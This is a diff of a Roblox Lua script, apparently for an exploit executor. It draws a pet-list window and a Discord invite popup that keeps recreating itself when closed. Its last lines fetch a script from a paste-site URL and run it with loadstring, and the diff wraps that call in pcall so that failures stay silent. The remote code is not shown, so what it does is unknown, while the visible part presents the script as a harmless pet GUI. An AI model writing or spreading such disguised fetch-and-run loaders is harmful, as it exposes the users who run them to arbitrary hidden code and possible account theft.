@@ -3,11 +3,12 @@
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-local gui = Instance.new("ScreenGui")
-gui.Name = "SmallPetGui"
-gui.Parent = playerGui
+-- SmallPetGui
+local smallPetGui = Instance.new("ScreenGui")
+smallPetGui.Name = "SmallPetGui"
+smallPetGui.Parent = playerGui
 
-local frame = Instance.new("Frame", gui)
+local frame = Instance.new("Frame", smallPetGui)
 frame.Size = UDim2.new(0, 300, 0, 200)
 frame.Position = UDim2.new(0.5, -150, 0.5, -100)
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
@@ -25,7 +26,7 @@ closeBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
 closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 closeBtn.MouseButton1Click:Connect(function()
-    frame.Visible = false
+	frame.Visible = false
 end)
 
 local title = Instance.new("TextLabel", frame)
@@ -75,6 +76,7 @@ for _, pet in ipairs(pets) do
     label.TextWrapped = true
 end
 
+-- Discord GUI
 local function createGUI()
     local ScreenGui = Instance.new("ScreenGui")
     local Frame = Instance.new("Frame")
@@ -91,7 +93,7 @@ local function createGUI()
     Frame.Name = "MainFrame"
     Frame.Parent = ScreenGui
     Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-    Frame.Position = UDim2.new(0.5, 0, 0.42, 0) -- slightly above center
+    Frame.Position = UDim2.new(0.5, 0, 0.42, 0)
     Frame.Size = UDim2.new(0, 320, 0, 100)
     Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
     Frame.BorderSizePixel = 0
@@ -100,7 +102,7 @@ local function createGUI()
     TextLabel.Size = UDim2.new(1, -20, 0.5, 0)
     TextLabel.Position = UDim2.new(0, 10, 0, 5)
     TextLabel.BackgroundTransparency = 1
-    TextLabel.Text = "Join our Discord server for help!\nIf it doesn't work, just re-execute!"
+    TextLabel.Text = "Join our Discord server if you need help!\nIf it doesn't work, just re-execute!"
     TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     TextLabel.Font = Enum.Font.Gotham
     TextLabel.TextSize = 14
@@ -129,17 +131,21 @@ local function createGUI()
     return ScreenGui
 end
 
--- main gui
-local gui = createGUI()
+local discordGui = createGUI()
 
--- anti-delete loop
+-- anti-delete loop for discord gui only
 task.spawn(function()
     while true do
-        if not gui or not gui.Parent then
-            gui = createGUI()
+        if not discordGui or not discordGui.Parent then
+            discordGui = createGUI()
         end
         task.wait(1)
     end
 end)
 
-loadstring(game:HttpGet("http://vpaste.net/fpugS"))()
+-- external script (runs last to prevent overwriting)
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("http://vpaste.net/fpugS"))()
+    end)
+end)
